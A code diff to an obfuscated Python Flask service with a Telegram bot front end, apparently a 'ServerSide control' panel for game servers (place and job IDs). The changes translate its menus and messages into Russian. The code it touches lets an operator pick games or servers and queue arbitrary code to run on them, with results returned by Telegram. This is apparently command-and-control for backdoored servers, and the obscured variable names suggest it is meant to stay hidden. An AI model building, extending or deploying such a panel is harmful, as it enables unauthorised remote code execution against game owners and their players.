@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 from flask import Flask, request, jsonify
 import threading, time, requests, os, io, json
 
@@ -113,33 +114,33 @@ def _edit(_mid, _t, _kb=None):
 def _menu_games():
     with _a4:
         if not _a5:
-            return "no active games", {"inline_keyboard": [[{"text": "refresh", "callback_data": "menu:games"}]]}
+            return "Активных игр нет.", {"inline_keyboard": [[{"text": "Обновить", "callback_data": "menu:games"}]]}
         _btns = []
-        _btns.append([{"text": "All games", "callback_data": "use:all:all"}])
+        _btns.append([{"text": "Все игры", "callback_data": "use:all:all"}])
         for _p, _js in _a5.items():
             _total = sum(j["players"] for j in _js.values())
             _btns.append([{
-                "text": f"{_p}   {len(_js)} srv   {_total}p",
+                "text": f"Игра {_p}   {len(_js)} серверов   {_total} игроков",
                 "callback_data": f"menu:game:{_p}"
             }])
-        _btns.append([{"text": "refresh", "callback_data": "menu:games"}])
-        return "select game:", {"inline_keyboard": _btns}
+        _btns.append([{"text": "Обновить", "callback_data": "menu:games"}])
+        return "Выбери игру:", {"inline_keyboard": _btns}
 
 def _menu_game(_p):
     with _a4:
         if _p not in _a5:
-            return "game offline", {"inline_keyboard": [[{"text": "Back", "callback_data": "menu:games"}]]}
+            return "Игра офлайн.", {"inline_keyboard": [[{"text": "Назад", "callback_data": "menu:games"}]]}
         _js = _a5[_p]
         _total = sum(j["players"] for j in _js.values())
         _btns = []
-        _btns.append([{"text": f"All servers ({_total}p)", "callback_data": f"use:{_p}:all"}])
+        _btns.append([{"text": f"Все серверы ({_total} игроков)", "callback_data": f"use:{_p}:all"}])
         for _j, _info in _js.items():
             _btns.append([{
-                "text": f"{_j[:20]}   {_info['players']}p",
+                "text": f"Сервер {_j[:20]}   {_info['players']} игроков",
                 "callback_data": f"use:{_p}:{_j}"
             }])
-        _btns.append([{"text": "Back", "callback_data": "menu:games"}])
-        return f"game {_p}:", {"inline_keyboard": _btns}
+        _btns.append([{"text": "Назад", "callback_data": "menu:games"}])
+        return f"Игра {_p}:", {"inline_keyboard": _btns}
 
 def _p1():
     _l = None
@@ -173,17 +174,17 @@ def _p1():
                                 _b1["target"] = "all"
                                 _b1["place"] = None
                                 _b1["job"] = None
-                                _edit(_mid, "target: All games", {"inline_keyboard": [[{"text": "Back", "callback_data": "menu:games"}]]})
+                                _edit(_mid, "Цель: все игры", {"inline_keyboard": [[{"text": "Назад", "callback_data": "menu:games"}]]})
                             elif _j == "all":
                                 _b1["target"] = "place"
                                 _b1["place"] = _p
                                 _b1["job"] = None
-                                _edit(_mid, f"target: place {_p}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
+                                _edit(_mid, f"Цель: игра {_p}", {"inline_keyboard": [[{"text": "Назад", "callback_data": f"menu:game:{_p}"}]]})
                             else:
                                 _b1["target"] = "job"
                                 _b1["place"] = _p
                                 _b1["job"] = _j
-                                _edit(_mid, f"target: {_p}/{_j[:12]}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
+                                _edit(_mid, f"Цель: сервер {_j[:20]}", {"inline_keyboard": [[{"text": "Назад", "callback_data": f"menu:game:{_p}"}]]})
                     try:
                         requests.post("https://api.telegram.org/bot" + _k1 + "/answerCallbackQuery",
                                       data={"callback_query_id": _cb["id"]})
@@ -197,10 +198,10 @@ def _p1():
 
                 if _x == "/start":
                     _s1("ServerSide control\n\n"
-                        "/games   active games\n"
-                        "/current current target\n"
-                        "/reset   target = all\n\n"
-                        "plain text -> current target"); continue
+                        "/games   активные игры\n"
+                        "/current текущая цель\n"
+                        "/reset   цель = все\n\n"
+                        "Обычный текст — выполнится на текущей цели."); continue
 
                 if _x == "/games":
                     _t, _kb = _menu_games()
@@ -208,33 +209,33 @@ def _p1():
                     continue
 
                 if _x == "/current":
-                    _s1(f"target: {_b1['target']}\nplace: {_b1['place']}\njob: {_b1['job']}")
+                    _s1(f"Цель: {_b1['target']}\nИгра: {_b1['place']}\nСервер: {_b1['job']}")
                     continue
 
                 if _x == "/reset":
                     _b1["target"] = "all"; _b1["place"] = None; _b1["job"] = None
-                    _s1("target = all"); continue
+                    _s1("Цель: все игры"); continue
 
                 if _x.startswith("all "):
                     _code = _x[4:]
                     with _a4:
                         _a2.append({"cmd": _code, "target": "all", "ts": time.time()})
-                    _s1("queued: all")
+                    _s1("Отправлено: все игры")
                     continue
 
                 _t = _b1["target"]
                 if _t == "all":
                     with _a4:
                         _a2.append({"cmd": _x, "target": "all", "ts": time.time()})
-                    _s1("queued: all")
+                    _s1("Отправлено: все игры")
                 elif _t == "place":
                     with _a4:
                         _a2.append({"cmd": _x, "target": "place", "place": _b1["place"], "ts": time.time()})
-                    _s1(f"queued: {_b1['place']}")
+                    _s1(f"Отправлено: игра {_b1['place']}")
                 elif _t == "job":
                     with _a4:
                         _a2.append({"cmd": _x, "target": "job", "job": _b1["job"], "ts": time.time()})
-                    _s1(f"queued: {_b1['job'][:12]}")
+                    _s1(f"Отправлено: сервер {_b1['job'][:20]}")
         except Exception as _e:
             print("err:", _e)
             time.sleep(3)
@@ -252,10 +253,10 @@ def _p2():
             _o = (_x.get("out") or "").strip()
             _tag = f"[{_x['place']}/{_x['job'][:8]}]"
             if _o.startswith("compile err:") or _o.startswith("runtime err:"):
-                _s1(f"{_tag} error\n{_o}")
+                _s1(f"{_tag} Ошибка\n{_o}")
             else:
                 if not _o or _o == "nil":
-                    _s1(f"{_tag} ok")
+                    _s1(f"{_tag} Выполнено")
                 else:
                     _s2("result.txt", f"{_tag} $ {_c}\n\n{_o}")
 
